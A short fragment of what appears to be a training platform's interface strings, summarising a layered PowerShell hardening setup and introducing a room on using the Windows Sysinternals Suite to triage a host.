tasks.example: Defence stack: 4104 (see it) + AMSI (scan it) + CLM (block it) + no v2 (no downgrade) + JEA (least privilege). Layered, PowerShell becomes safe to allow.

rooms.title: Windows Sysinternals Suite
rooms.subtitle: Deep Windows visibility — processes, autostarts, network and telemetry.
rooms.blurb: Use Process Explorer, Procmon, Autoruns, TCPView, Sigcheck and PsTools to triage a host — safely.

tasks.title: What Sysinternals is
